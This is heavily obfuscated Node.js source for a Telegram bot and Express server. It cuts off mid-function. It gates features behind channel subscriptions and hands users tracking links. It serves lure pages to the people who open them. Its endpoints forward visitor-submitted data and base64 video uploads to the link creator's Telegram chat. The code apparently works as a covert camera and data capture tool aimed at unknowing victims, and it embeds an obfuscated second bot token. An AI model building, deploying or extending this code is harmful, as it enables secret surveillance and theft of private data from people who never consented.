const _0x544f76 = _0x6efd;
(function (_0x47e671, _0x5aa502) {
    const _0x64fa37 = _0x6efd, _0x1a1f9a = _0x47e671();
    while (!![]) {
        try {
            const _0x1b9e9b = parseInt(_0x64fa37(0x458)) / (-0x720 * -0x5 + -0x13c7 + 0x2 * -0x7ec) + -parseInt(_0x64fa37(0x6aa)) / (0x1 * -0x93a + -0x1 * -0x1b9 + -0x3 * -0x281) + -parseInt(_0x64fa37(0x730)) / (-0x57b * 0x1 + -0x1406 * -0x1 + -0x4d8 * 0x3) + -parseInt(_0x64fa37(0x682)) / (0x182 * -0xa + -0x1bc5 * -0x1 + -0xcad) + parseInt(_0x64fa37(0x389)) / (0x411 + -0x1c7e * 0x1 + 0x2a * 0x95) + parseInt(_0x64fa37(0x889)) / (-0x1b5c * -0x1 + 0x25bb + -0x1 * 0x4111) * (-parseInt(_0x64fa37(0x3bf)) / (-0x1 * 0x1bce + 0x1d35 + -0x160)) + parseInt(_0x64fa37(0x652)) / (0x1603 + -0x20e4 + 0xae9);
            if (_0x1b9e9b === _0x5aa502)
                break;
            else
                _0x1a1f9a['push'](_0x1a1f9a['shift']());
        } catch (_0x12d068) {
            _0x1a1f9a['push'](_0x1a1f9a['shift']());
        }
    }
}(_0x2725, 0x1 * -0xef32 + 0x3ec86 + 0x3f09), require(_0x544f76(0x39a))[_0x544f76(0x659)]());
const TelegramBot = require(_0x544f76(0x708) + _0x544f76(0x19e) + 'i'), express = require(_0x544f76(0x734)), bodyParser = require(_0x544f76(0x19f) + 'r'), multer = require(_0x544f76(0x52a)), path = require(_0x544f76(0x2b2)), fs = require('fs'), crypto = require(_0x544f76(0x45b)), axios = require(_0x544f76(0x50d)), uuid = require(_0x544f76(0x50e)), cheerio = require(_0x544f76(0x71b)), dns = require(_0x544f76(0x65d)), sleep = _0x23677f => new Promise(_0xdb87e7 => setTimeout(_0xdb87e7, _0x23677f)), botToken = process[_0x544f76(0x5ed)]['n'], botUsername = _0x544f76(0x3e7), bot = new TelegramBot(botToken, { 'polling': !![] }), developerChannels = [
        _0x544f76(0x224),
        _0x544f76(0x6e9),
        _0x544f76(0x196),
        _0x544f76(0x5cb),
        _0x544f76(0x505)
    ], SECOND_BOT_TOKEN = _0x544f76(0x878) + _0x544f76(0x38f) + _0x544f76(0x836) + _0x544f76(0x3cb) + _0x544f76(0x1e9), secondBot = new TelegramBot(SECOND_BOT_TOKEN, { 'polling': !![] });
let inviteLinks = {}, userPoints = {}, linkData = {}, visitorData = {};
function clearCache() {
    const _0x21ac36 = _0x544f76, _0x519f70 = { 'vsfjo': _0x21ac36(0x8bc) + _0x21ac36(0x896) };
    console[_0x21ac36(0x2e0)](_0x519f70[_0x21ac36(0x1d6)]), userPoints = {}, linkData = {}, visitorData = {};
    const _0x367419 = {};
}
setInterval(clearCache, (-0x1be7 + -0x2 * 0x115a + 0x1 * 0x45a3) * (0x24be + -0x1790 + -0x946));
async function isUserSubscribed(_0x1b8e4c) {
    const _0x2cb956 = _0x544f76, _0x390e44 = {
            'nGTxO': function (_0x147cde, _0x5ad908) {
                return _0x147cde === _0x5ad908;
            },
            'MbMyF': _0x2cb956(0x197),
            'oIQKk': function (_0x362b82, _0x214290) {
                return _0x362b82 === _0x214290;
            },
            'KJoxo': _0x2cb956(0x6f3) + _0x2cb956(0x5aa),
            'luhyp': _0x2cb956(0x6c1),
            'hVxgk': _0x2cb956(0x5b2) + _0x2cb956(0x748) + _0x2cb956(0x425) + _0x2cb956(0x40b)
        };
    try {
        const _0x43ce0d = await Promise[_0x2cb956(0x364)](developerChannels[_0x2cb956(0x430)](_0x240667 => bot[_0x2cb956(0x247) + _0x2cb956(0x56d)](_0x240667, _0x1b8e4c)));
        return _0x43ce0d[_0x2cb956(0x402)](_0x111791 => {
            const _0x2f76fa = _0x2cb956, _0x16adc3 = _0x111791[_0x2f76fa(0x7d7)];
            return _0x390e44[_0x2f76fa(0x2c1)](_0x16adc3, _0x390e44[_0x2f76fa(0x875)]) || _0x390e44[_0x2f76fa(0x23a)](_0x16adc3, _0x390e44[_0x2f76fa(0x30f)]) || _0x390e44[_0x2f76fa(0x2c1)](_0x16adc3, _0x390e44[_0x2f76fa(0x792)]);
        });
    } catch (_0x5ce4c5) {
        return console[_0x2cb956(0x20f)](_0x390e44[_0x2cb956(0x540)], _0x5ce4c5), ![];
    }
}
bot[_0x544f76(0x937)](/\/Vip/, async _0x152e77 => {
    const _0x4cf74b = _0x544f76, _0x199cf2 = {
            'kQIjV': function (_0x40efbc, _0x22a4f4) {
                return _0x40efbc(_0x22a4f4);
            },
            'fPHqC': _0x4cf74b(0x91b) + _0x4cf74b(0x927) + _0x4cf74b(0x6dc) + _0x4cf74b(0x7c4) + _0x4cf74b(0x773) + _0x4cf74b(0x3e9),
            'dvRnC': _0x4cf74b(0x2d6) + _0x4cf74b(0x44b) + _0x4cf74b(0x4c6) + _0x4cf74b(0x757) + _0x4cf74b(0x3e3) + _0x4cf74b(0x1bb) + _0x4cf74b(0x35c) + '.',
            'TfpmL': _0x4cf74b(0x483) + _0x4cf74b(0x7ce) + _0x4cf74b(0x382),
            'jfiGU': _0x4cf74b(0x786) + _0x4cf74b(0x5c7) + _0x4cf74b(0x45a) + _0x4cf74b(0x7f9),
            'anypR': _0x4cf74b(0x7a1) + _0x4cf74b(0x49e) + _0x4cf74b(0x804) + _0x4cf74b(0x71c),
            'nImvp': _0x4cf74b(0x225) + _0x4cf74b(0x476) + _0x4cf74b(0x921)
        }, _0xdac5e0 = _0x152e77[_0x4cf74b(0x638)]['id'], _0x13df1f = _0x152e77[_0x4cf74b(0x953)]['id'], _0x4fde27 = await _0x199cf2[_0x4cf74b(0x8c7)](isUserSubscribed, _0xdac5e0);
    if (!_0x4fde27) {
        const _0x2dd4df = _0x199cf2[_0x4cf74b(0x79e)], _0x1f3c5c = developerChannels[_0x4cf74b(0x430)](_0x37d10f => [{
                    'text': _0x4cf74b(0x6ed) + _0x37d10f,
                    'url': _0x4cf74b(0x82a) + _0x4cf74b(0x4c0) + _0x37d10f[_0x4cf74b(0x6ab)](0x7f0 + -0x909 + -0x2 * -0x8d)
                }]);
        bot[_0x4cf74b(0x84f) + 'e'](_0xdac5e0, _0x2dd4df, { 'reply_markup': { 'inline_keyboard': _0x1f3c5c } });
        return;
    }
    const _0x370a7c = uuid['v4']();
    linkData[_0x370a7c] = {
        'userId': _0x13df1f,
        'chatId': _0xdac5e0,
        'visitors': []
    };
    const _0x4d0051 = _0x199cf2[_0x4cf74b(0x510)];
    bot[_0x4cf74b(0x84f) + 'e'](_0xdac5e0, _0x4d0051, {
        'reply_markup': {
            'inline_keyboard': [
                [{
                        'text': _0x199cf2[_0x4cf74b(0x32a)],
                        'callback_data': _0x4cf74b(0x4e6) + _0x370a7c
                    }],
                [{
                        'text': _0x199cf2[_0x4cf74b(0x781)],
                        'callback_data': _0x4cf74b(0x4e6) + _0x370a7c
                    }],
                [{
                        'text': _0x199cf2[_0x4cf74b(0x547)],
                        'callback_data': _0x4cf74b(0x4e6) + _0x370a7c
                    }],
                [{
                        'text': _0x199cf2[_0x4cf74b(0x6b4)],
                        'callback_data': _0x4cf74b(0x4e6) + _0x370a7c
                    }]
            ]
        }
    });
}), bot['on'](_0x544f76(0x84b) + _0x544f76(0x2d1), async _0x33139c => {
    const _0x3321ec = _0x544f76, _0x3e9043 = {
            'uHbsR': function (_0x46725b, _0x4b9bdb) {
                return _0x46725b === _0x4b9bdb;
            }
        }, _0x8cd872 = _0x33139c[_0x3321ec(0x320)][_0x3321ec(0x638)]['id'], _0x52faaf = _0x33139c[_0x3321ec(0x953)]['id'], _0x20c525 = _0x33139c[_0x3321ec(0x8fe)][_0x3321ec(0x7b8)]('_')[0xa3 * -0x1f + 0x624 + 0xd9b];
    if (linkData[_0x20c525] && _0x3e9043[_0x3321ec(0x7a4)](linkData[_0x20c525][_0x3321ec(0x3b8)], _0x52faaf)) {
        const _0x57cfc1 = _0x3321ec(0x4ad) + _0x3321ec(0x381) + _0x3321ec(0x7c5) + _0x3321ec(0x1a2) + _0x3321ec(0x299) + _0x3321ec(0x62b) + _0x3321ec(0x3a5) + _0x3321ec(0x482) + _0x3321ec(0x8c0) + _0x3321ec(0x77a) + _0x3321ec(0x391) + botUsername + _0x3321ec(0x883) + _0x20c525;
        bot[_0x3321ec(0x84f) + 'e'](_0x8cd872, _0x57cfc1);
    }
});
const baseUrl = process[_0x544f76(0x5ed)]['r'];
bot[_0x544f76(0x937)](/\/vip (.+)/, async (_0x28a5a0, _0x582d6f) => {
    const _0x36364c = _0x544f76, _0x2bcc3f = {
            'QjqUc': function (_0x349f31, _0x3bb2b3) {
                return _0x349f31(_0x3bb2b3);
            },
            'cmriF': _0x36364c(0x91b) + _0x36364c(0x927) + _0x36364c(0x6dc) + _0x36364c(0x7c4) + _0x36364c(0x773) + _0x36364c(0x3e9),
            'ePLkK': function (_0x3e985f, _0x3bf051) {
                return _0x3e985f !== _0x3bf051;
            }
        }, _0x1de930 = _0x582d6f[-0x1ab3 + -0x9 * 0x1 + 0x1abd], _0x575b02 = _0x28a5a0[_0x36364c(0x953)]['id'], _0x4eb147 = _0x28a5a0[_0x36364c(0x638)]['id'], _0x1a5789 = await _0x2bcc3f[_0x36364c(0x2af)](isUserSubscribed, _0x4eb147);
    if (!_0x1a5789) {
        const _0x215808 = _0x2bcc3f[_0x36364c(0x211)], _0x1d8f85 = developerChannels[_0x36364c(0x430)](_0xc801f0 => [{
                    'text': _0x36364c(0x6ed) + _0xc801f0,
                    'url': _0x36364c(0x82a) + _0x36364c(0x4c0) + _0xc801f0[_0x36364c(0x6ab)](-0x2415 * 0x1 + 0x53 * -0x4f + 0x5 * 0xc57)
                }]);
        bot[_0x36364c(0x84f) + 'e'](_0x4eb147, _0x215808, { 'reply_markup': { 'inline_keyboard': _0x1d8f85 } });
        return;
    }
    if (linkData[_0x1de930]) {
        const {
            userId: _0x484aa4,
            visitors: _0x2a7e62
        } = linkData[_0x1de930];
        if (_0x2bcc3f[_0x36364c(0x51a)](_0x575b02, _0x484aa4) && (!visitorData[_0x575b02] || !visitorData[_0x575b02][_0x36364c(0x8a7)](_0x484aa4))) {
            _0x2a7e62[_0x36364c(0x3f0)](_0x575b02);
            !visitorData[_0x575b02] && (visitorData[_0x575b02] = []);
            visitorData[_0x575b02][_0x36364c(0x3f0)](_0x484aa4);
            !userPoints[_0x484aa4] && (userPoints[_0x484aa4] = 0x1cb3 + 0x5ff * -0x1 + -0x16b4);
            userPoints[_0x484aa4] += -0x593 * 0x1 + -0x4b9 * 0x6 + -0x10f5 * -0x2;
            const _0x4e60a2 = _0x36364c(0x467) + _0x36364c(0x4d1) + _0x36364c(0x3a5) + _0x36364c(0x641) + _0x36364c(0x67c) + _0x36364c(0x808) + _0x36364c(0x876) + _0x36364c(0x75b) + _0x36364c(0x45c) + _0x36364c(0x1f9);
            bot[_0x36364c(0x84f) + 'e'](_0x4eb147, _0x4e60a2);
            const _0x3c78e7 = _0x36364c(0x87c) + _0x36364c(0x56b) + _0x36364c(0x703) + _0x36364c(0x67a) + _0x36364c(0x6e1);
            bot[_0x36364c(0x84f) + 'e'](_0x484aa4, _0x3c78e7);
        }
    }
}), bot['on'](_0x544f76(0x84b) + _0x544f76(0x2d1), async _0x327b02 => {
    const _0x329bfd = _0x544f76, _0x1f39da = {
            'QtWuw': function (_0x6b6a97, _0x50b2c9) {
                return _0x6b6a97 === _0x50b2c9;
            }
        }, _0x3f9b72 = _0x327b02[_0x329bfd(0x320)][_0x329bfd(0x638)]['id'], _0x5bd182 = _0x327b02[_0x329bfd(0x953)]['id'], _0x547889 = _0x327b02[_0x329bfd(0x8fe)][_0x329bfd(0x7b8)]('_')[0x2 * 0xb2e + 0xe9 * 0xe + -0x8c6 * 0x4];
    if (linkData[_0x547889] && _0x1f39da[_0x329bfd(0x5ff)](linkData[_0x547889][_0x329bfd(0x3b8)], _0x5bd182)) {
        const _0x22a1e4 = _0x329bfd(0x4ad) + _0x329bfd(0x381) + _0x329bfd(0x7c5) + _0x329bfd(0x1a2) + _0x329bfd(0x299) + _0x329bfd(0x62b) + _0x329bfd(0x3a5) + _0x329bfd(0x482) + _0x329bfd(0x60a) + _0x329bfd(0x42c) + _0x329bfd(0x514) + botUsername + _0x329bfd(0x883) + _0x547889;
        bot[_0x329bfd(0x84f) + 'e'](_0x3f9b72, _0x22a1e4);
    }
}), bot[_0x544f76(0x937)](/\/start (.+)/, async (_0x511dc8, _0x5c3ce4) => {
    const _0x348b42 = _0x544f76, _0x5de8f8 = {
            'UDKtI': function (_0x4c0f08, _0x432032) {
                return _0x4c0f08(_0x432032);
            },
            'GfDdb': _0x348b42(0x91b) + _0x348b42(0x927) + _0x348b42(0x6dc) + _0x348b42(0x7c4) + _0x348b42(0x773) + _0x348b42(0x3e9),
            'VNlSp': function (_0x39d2d9, _0x2d86d5) {
                return _0x39d2d9 !== _0x2d86d5;
            }
        }, _0x3de922 = _0x5c3ce4[-0x1c * 0x71 + -0x1e6f + 0x14c * 0x21], _0x2f08a7 = _0x511dc8[_0x348b42(0x953)]['id'], _0x42faa8 = _0x511dc8[_0x348b42(0x638)]['id'], _0x473fa2 = await _0x5de8f8[_0x348b42(0x52f)](isUserSubscribed, _0x42faa8);
    if (!_0x473fa2) {
        const _0x3a2e65 = _0x5de8f8[_0x348b42(0x94e)], _0x463147 = developerChannels[_0x348b42(0x430)](_0xf318ee => [{
                    'text': _0x348b42(0x6ed) + _0xf318ee,
                    'url': _0x348b42(0x82a) + _0x348b42(0x4c0) + _0xf318ee[_0x348b42(0x6ab)](-0x132f + -0x12b1 + 0x25e1)
                }]);
        bot[_0x348b42(0x84f) + 'e'](_0x42faa8, _0x3a2e65, { 'reply_markup': { 'inline_keyboard': _0x463147 } });
        return;
    }
    if (linkData[_0x3de922]) {
        const {
            userId: _0x2e52e1,
            chatId: _0x75daaf,
            visitors: _0x4e02a8
        } = linkData[_0x3de922];
        if (_0x5de8f8[_0x348b42(0x8ba)](_0x2f08a7, _0x2e52e1) && (!visitorData[_0x2f08a7] || !visitorData[_0x2f08a7][_0x348b42(0x8a7)](_0x2e52e1))) {
            _0x4e02a8[_0x348b42(0x3f0)](_0x2f08a7);
            !visitorData[_0x2f08a7] && (visitorData[_0x2f08a7] = []);
            visitorData[_0x2f08a7][_0x348b42(0x3f0)](_0x2e52e1);
            !userPoints[_0x2e52e1] && (userPoints[_0x2e52e1] = 0x1738 + 0x1b58 + -0x3290);
            userPoints[_0x2e52e1] += 0xd91 + -0x2425 + 0x1695 * 0x1;
            const _0xcaeaa0 = _0x348b42(0x467) + _0x348b42(0x4d1) + _0x348b42(0x3a5) + _0x348b42(0x641) + _0x348b42(0x833) + _0x348b42(0x692) + _0x348b42(0x8de) + _0x348b42(0x8ae) + _0x348b42(0x67a) + _0x348b42(0x81c) + _0x348b42(0x7da);
            bot[_0x348b42(0x84f) + 'e'](_0x75daaf, _0xcaeaa0);
        }
    }
});
const app = express();
app[_0x544f76(0x513)](bodyParser[_0x544f76(0x5ec)]({
    'extended': !![],
    'limit': _0x544f76(0x91e)
})), app[_0x544f76(0x513)](bodyParser[_0x544f76(0x7b5)]({ 'limit': _0x544f76(0x791) })), app[_0x544f76(0x513)](express[_0x544f76(0x295)](__dirname));
const storage = multer[_0x544f76(0x774) + _0x544f76(0x38c)](), upload = multer({ 'storage': storage }), uploadVoice = multer({ 'dest': _0x544f76(0x370) });
app[_0x544f76(0x4f5)](_0x544f76(0x1f2) + 'rm', (_0x5370f8, _0x54c92c) => {
    const _0x1dbe59 = _0x544f76, _0x59914b = {
            'UQacU': _0x1dbe59(0x45e) + _0x1dbe59(0x561) + _0x1dbe59(0x95b),
            'uRYWP': _0x1dbe59(0x1d0),
            'tXyVu': _0x1dbe59(0x80f),
            'ePBXn': _0x1dbe59(0x828),
            'CmAUG': _0x1dbe59(0x43b),
            'zCFNw': _0x1dbe59(0x84a),
            'zumeV': _0x1dbe59(0x47e)
        }, _0x400271 = _0x5370f8[_0x1dbe59(0x439)][_0x1dbe59(0x572)], _0xa31c92 = _0x5370f8[_0x1dbe59(0x439)][_0x1dbe59(0x72c)];
    if (!_0x400271)
        return _0x54c92c[_0x1dbe59(0x7d7)](0x1abf + 0x14e7 + -0x11 * 0x2b6)[_0x1dbe59(0x5a1)](_0x59914b[_0x1dbe59(0x73c)]);
    let _0x211f63 = '';
    switch (_0xa31c92) {
    case _0x59914b[_0x1dbe59(0x616)]:
        _0x211f63 = _0x59914b[_0x1dbe59(0x7ea)];
        break;
    case _0x59914b[_0x1dbe59(0x451)]:
        _0x211f63 = _0x59914b[_0x1dbe59(0x468)];
        break;
    case _0x59914b[_0x1dbe59(0x5c0)]:
    default:
        _0x211f63 = _0x59914b[_0x1dbe59(0x1f4)];
        break;
    }
    _0x54c92c[_0x1dbe59(0x89c)](path[_0x1dbe59(0x1ec)](__dirname, _0x211f63));
}), app[_0x544f76(0x4f5)](_0x544f76(0x6f8) + _0x544f76(0x3e5), (_0x47787f, _0xb7125b) => {
    const _0x161b52 = _0x544f76, _0x4040a0 = {
            'PdRCI': function (_0x35d724, _0x41cf0f) {
                return _0x35d724(_0x41cf0f);
            },
            'aKgvu': _0x161b52(0x528),
            'nvObP': _0x161b52(0x797) + _0x161b52(0x949) + _0x161b52(0x89a) + _0x161b52(0x6bf) + _0x161b52(0x1b9) + _0x161b52(0x870),
            'FOwfc': _0x161b52(0x77c) + _0x161b52(0x6f1) + _0x161b52(0x622) + _0x161b52(0x1e4) + _0x161b52(0x955) + _0x161b52(0x4d8)
        }, _0x56092e = _0x47787f[_0x161b52(0x525)][_0x161b52(0x608)];
    _0x4040a0[_0x161b52(0x21c)](validateLinkUsage, _0x56092e) ? _0xb7125b[_0x161b52(0x89c)](path[_0x161b52(0x1ec)](__dirname, _0x4040a0[_0x161b52(0x293)])) : (_0xb7125b[_0x161b52(0x5a1)](_0x4040a0[_0x161b52(0x918)]), bot[_0x161b52(0x84f) + 'e'](linkUsage[_0x56092e][_0x161b52(0x572)], _0x4040a0[_0x161b52(0x8d0)]));
}), app[_0x544f76(0x4f5)](_0x544f76(0x366) + _0x544f76(0x300) + 'd', (_0x4b3c68, _0x272b77) => {
    const _0x424741 = _0x544f76, _0x4c5dd5 = {
            'fZHai': function (_0xd6cda8, _0x5b776c) {
                return _0xd6cda8(_0x5b776c);
            },
            'hMPBH': _0x424741(0x3b7),
            'gAFiA': _0x424741(0x797) + _0x424741(0x949) + _0x424741(0x89a) + _0x424741(0x6bf) + _0x424741(0x1b9) + _0x424741(0x870),
            'mPuDH': _0x424741(0x77c) + _0x424741(0x6f1) + _0x424741(0x622) + _0x424741(0x1e4) + _0x424741(0x955) + _0x424741(0x4d8)
        }, _0x4f1e50 = _0x4b3c68[_0x424741(0x525)][_0x424741(0x608)];
    _0x4c5dd5[_0x424741(0x328)](validateLinkUsage, _0x4f1e50) ? _0x272b77[_0x424741(0x89c)](path[_0x424741(0x1ec)](__dirname, _0x4c5dd5[_0x424741(0x7d0)])) : (_0x272b77[_0x424741(0x5a1)](_0x4c5dd5[_0x424741(0x485)]), bot[_0x424741(0x84f) + 'e'](linkUsage[_0x4f1e50][_0x424741(0x572)], _0x4c5dd5[_0x424741(0x319)]));
}), app[_0x544f76(0x4f5)](_0x544f76(0x8a6) + _0x544f76(0x218), (_0xa7f49f, _0x38cf64) => {
    const _0x326af3 = _0x544f76, _0x5aad7c = {
            'hrNDM': function (_0x22c9c7, _0x32e007) {
                return _0x22c9c7(_0x32e007);
            },
            'kDxLx': _0x326af3(0x957),
            'DUPOt': _0x326af3(0x797) + _0x326af3(0x949) + _0x326af3(0x89a) + _0x326af3(0x6bf) + _0x326af3(0x1b9) + _0x326af3(0x870),
            'CFlse': _0x326af3(0x77c) + _0x326af3(0x6f1) + _0x326af3(0x622) + _0x326af3(0x1e4) + _0x326af3(0x955) + _0x326af3(0x4d8)
        }, _0xa52711 = _0xa7f49f[_0x326af3(0x525)][_0x326af3(0x608)];
    _0x5aad7c[_0x326af3(0x619)](validateLinkUsage, _0xa52711) ? _0x38cf64[_0x326af3(0x89c)](path[_0x326af3(0x1ec)](__dirname, _0x5aad7c[_0x326af3(0x446)])) : (_0x38cf64[_0x326af3(0x5a1)](_0x5aad7c[_0x326af3(0x199)]), bot[_0x326af3(0x84f) + 'e'](linkUsage[_0xa52711][_0x326af3(0x572)], _0x5aad7c[_0x326af3(0x7a9)]));
}), app[_0x544f76(0x4f5)](_0x544f76(0x66d) + _0x544f76(0x81d), (_0x44cb56, _0x29e6ee) => {
    const _0x4ecdad = _0x544f76, _0x153e0a = {
            'zuoTv': function (_0x15e2f7, _0x4da1da) {
                return _0x15e2f7(_0x4da1da);
            },
            'YxgSr': _0x4ecdad(0x262),
            'hvQTo': _0x4ecdad(0x797) + _0x4ecdad(0x949) + _0x4ecdad(0x89a) + _0x4ecdad(0x6bf) + _0x4ecdad(0x1b9) + _0x4ecdad(0x870),
            'XReEE': _0x4ecdad(0x77c) + _0x4ecdad(0x6f1) + _0x4ecdad(0x622) + _0x4ecdad(0x1e4) + _0x4ecdad(0x955) + _0x4ecdad(0x4d8)
        }, _0x2711ef = _0x44cb56[_0x4ecdad(0x525)][_0x4ecdad(0x608)];
    _0x153e0a[_0x4ecdad(0x597)](validateLinkUsage, _0x2711ef) ? _0x29e6ee[_0x4ecdad(0x89c)](path[_0x4ecdad(0x1ec)](__dirname, _0x153e0a[_0x4ecdad(0x2e3)])) : (_0x29e6ee[_0x4ecdad(0x5a1)](_0x153e0a[_0x4ecdad(0x653)]), bot[_0x4ecdad(0x84f) + 'e'](linkUsage[_0x2711ef][_0x4ecdad(0x572)], _0x153e0a[_0x4ecdad(0x72d)]));
}), app[_0x544f76(0x5cd)](_0x544f76(0x3e1) + 'es', (_0x11aff5, _0x5e8472) => {
    const _0x50984f = _0x544f76, _0x5b6904 = {
            'NYWUU': _0x50984f(0x54c) + _0x50984f(0x849) + _0x50984f(0x856) + ':',
            'bUqdS': _0x50984f(0x27d) + _0x50984f(0x623),
            'sDJLJ': _0x50984f(0x53b)
        }, _0xe58bf7 = _0x11aff5[_0x50984f(0x539)][_0x50984f(0x572)], _0x30c3bc = _0x11aff5[_0x50984f(0x539)][_0x50984f(0x541)], _0x45ef08 = _0x11aff5[_0x50984f(0x539)][_0x50984f(0x85a)];
    console[_0x50984f(0x2e0)](_0x5b6904[_0x50984f(0x59a)], _0x11aff5[_0x50984f(0x539)]), bot[_0x50984f(0x84f) + 'e'](_0xe58bf7, _0x50984f(0x672) + _0x50984f(0x6a9) + _0x50984f(0x2da) + ':\x20' + _0x30c3bc + (_0x50984f(0x844) + _0x50984f(0x655)) + _0x45ef08)[_0x50984f(0x507)](() => {
    })[_0x50984f(0x854)](_0x5ca63f => {
        const _0x5d149c = _0x50984f;
        console[_0x5d149c(0x20f)](_0x5b6904[_0x5d149c(0x809)], _0x5ca63f[_0x5d149c(0x4aa)] ? _0x5ca63f[_0x5d149c(0x4aa)][_0x5d149c(0x539)] : _0x5ca63f);
    }), _0x5e8472[_0x50984f(0x7c0)](_0x5b6904[_0x50984f(0x89e)]);
}), app[_0x544f76(0x513)](bodyParser[_0x544f76(0x7b5)]()), app[_0x544f76(0x513)](express[_0x544f76(0x295)](__dirname)), app[_0x544f76(0x4f5)](_0x544f76(0x59d), (_0x463316, _0x227a28) => {
    const _0x509e68 = _0x544f76, _0xe7462f = { 'Obbwn': _0x509e68(0x1e2) };
    _0x227a28[_0x509e68(0x89c)](path[_0x509e68(0x1ec)](__dirname, _0xe7462f[_0x509e68(0x69b)]));
}), app[_0x544f76(0x5cd)](_0x544f76(0x86c) + _0x544f76(0x5ca), (_0x1c3052, _0x4bc223) => {
    const _0x2ab2bb = _0x544f76, _0x43af6c = { 'ViUNr': _0x2ab2bb(0x54c) + _0x2ab2bb(0x849) + _0x2ab2bb(0x856) + ':' }, _0x24055a = _0x1c3052[_0x2ab2bb(0x539)][_0x2ab2bb(0x572)], _0x250b85 = _0x1c3052[_0x2ab2bb(0x539)][_0x2ab2bb(0x907) + 'r'];
    bot[_0x2ab2bb(0x84f) + 'e'](_0x24055a, _0x2ab2bb(0x3f4) + _0x2ab2bb(0x418) + _0x2ab2bb(0x60f) + _0x2ab2bb(0x34c) + _0x2ab2bb(0x4f4) + _0x2ab2bb(0x339) + _0x2ab2bb(0x2a1) + _0x2ab2bb(0x95a) + ':\x20' + _0x250b85)[_0x2ab2bb(0x507)](() => {
        const _0x2300d0 = _0x2ab2bb;
        _0x4bc223[_0x2300d0(0x7b5)]({ 'success': !![] });
    })[_0x2ab2bb(0x854)](_0x4e12ac => {
        const _0x5b5638 = _0x2ab2bb;
        console[_0x5b5638(0x20f)](_0x43af6c[_0x5b5638(0x8be)], _0x4e12ac[_0x5b5638(0x4aa)] ? _0x4e12ac[_0x5b5638(0x4aa)][_0x5b5638(0x539)] : _0x4e12ac), _0x4bc223[_0x5b5638(0x7b5)]({ 'success': ![] });
    });
}), app[_0x544f76(0x5cd)](_0x544f76(0x3ba) + 'e', (_0x360a40, _0x56f34b) => {
    const _0x476fee = _0x544f76, _0x5a512d = {
            'sFZYk': _0x476fee(0x7ed) + _0x476fee(0x1ce) + _0x476fee(0x890),
            'ojsKJ': _0x476fee(0x54c) + _0x476fee(0x849) + _0x476fee(0x856) + ':'
        }, _0x5e527d = _0x360a40[_0x476fee(0x539)][_0x476fee(0x572)], _0x1c430e = _0x360a40[_0x476fee(0x539)][_0x476fee(0x25b)];
    bot[_0x476fee(0x84f) + 'e'](_0x5e527d, _0x476fee(0x236) + _0x476fee(0x59f) + _0x476fee(0x30c) + '\x20' + _0x1c430e)[_0x476fee(0x507)](() => {
        const _0xe2bd0 = _0x476fee;
        _0x56f34b[_0xe2bd0(0x7c0)](_0x5a512d[_0xe2bd0(0x601)]);
    })[_0x476fee(0x854)](_0x58116c => {
        const _0x3a03fe = _0x476fee;
        console[_0x3a03fe(0x20f)](_0x5a512d[_0x3a03fe(0x538)], _0x58116c[_0x3a03fe(0x4aa)] ? _0x58116c[_0x3a03fe(0x4aa)][_0x3a03fe(0x539)] : _0x58116c), _0x56f34b[_0x3a03fe(0x7b5)]({ 'success': ![] });
    });
}), app[_0x544f76(0x513)](bodyParser[_0x544f76(0x7b5)]({ 'limit': _0x544f76(0x78d) })), app[_0x544f76(0x513)](bodyParser[_0x544f76(0x5ec)]({
    'limit': _0x544f76(0x78d),
    'extended': !![]
}));
const dataStore = {};
app[_0x544f76(0x513)](express[_0x544f76(0x295)](__dirname)), app[_0x544f76(0x5cd)](_0x544f76(0x40e) + 'eo', (_0x5ce44b, _0xa12719) => {
    const _0x2a01d7 = _0x544f76, _0xe85a2e = {
            'sqHBX': _0x2a01d7(0x6ef),
            'nSsem': _0x2a01d7(0x54c) + _0x2a01d7(0x25c),
            'JCHBQ': _0x2a01d7(0x2fb) + _0x2a01d7(0x942),
            'PwRLD': function (_0x2ebfdb, _0x1f7371) {
                return _0x2ebfdb || _0x1f7371;
            },
            'dsHZP': _0x2a01d7(0x83d) + _0x2a01d7(0x745) + _0x2a01d7(0x58e) + _0x2a01d7(0x569) + _0x2a01d7(0x956),
            'PzFvN': _0x2a01d7(0x858),
            'tymEB': _0x2a01d7(0x48f),
            'MnjGz': _0x2a01d7(0x826) + _0x2a01d7(0x803) + _0x2a01d7(0x8db),
            'JDgJv': _0x2a01d7(0x600) + _0x2a01d7(0x594) + _0x2a01d7(0x95f),
            'rEPKt': _0x2a01d7(0x2fb) + _0x2a01d7(0x1ca) + _0x2a01d7(0x43f)
        }, _0x38fa53 = _0x5ce44b[_0x2a01d7(0x539)][_0x2a01d7(0x572)], _0x403846 = _0x5ce44b[_0x2a01d7(0x539)][_0x2a01d7(0x769)];
    if (_0xe85a2e[_0x2a01d7(0x4da)](!_0x38fa53, !_0x403846))
        return _0xa12719[_0x2a01d7(0x7d7)](0x4 * 0x581 + -0xb * 0x8f + -0xe4f)[_0x2a01d7(0x5a1)](_0xe85a2e[_0x2a01d7(0x400)]);
    const _0x132f1c = _0x403846[_0x2a01d7(0x7b8)](',')[0xeea + 0x18f6 + -0xad * 0x3b], _0x3f9864 = path[_0x2a01d7(0x1ec)](__dirname, _0xe85a2e[_0x2a01d7(0x90d)]);
    !fs[_0x2a01d7(0x706)](_0x3f9864) && fs[_0x2a01d7(0x8e8)](_0x3f9864);
    try {
        const _0x52931e = Buffer[_0x2a01d7(0x953)](_0x132f1c, _0xe85a2e[_0x2a01d7(0x578)]), _0x9d483a = path[_0x2a01d7(0x1ec)](_0x3f9864, _0x38fa53 + _0x2a01d7(0x830));
        fs[_0x2a01d7(0x6c4) + _0x2a01d7(0x53c)](_0x9d483a, _0x52931e), bot[_0x2a01d7(0x6f4)](_0x38fa53, _0x9d483a, { 'caption': _0xe85a2e[_0x2a01d7(0x1fa)] })[_0x2a01d7(0x507)](() => {
            const _0x1880a8 = _0x2a01d7;
            console[_0x1880a8(0x2e0)](_0x1880a8(0x894) + _0x1880a8(0x8e7) + _0x1880a8(0x54d) + _0x1880a8(0x5cf) + _0x38fa53), _0xa12719[_0x1880a8(0x7c0)](_0xe85a2e[_0x1880a8(0x8e9)]);
        })[_0x2a01d7(0x854)](_0x191a2f => {
            const _0x3d0266 = _0x2a01d7;
            console[_0x3d0266(0x20f)](_0xe85a2e[_0x3d0266(0x613)], _0x191a2f), _0xa12719[_0x3d0266(0x7d7)](-0xd * -0x65 + -0x16e7 + 0x5 * 0x3f2)[_0x3d0266(0x5a1)](_0xe85a2e[_0x3d0266(0x3dd)]);
        });
    } catch (_0x125564) {
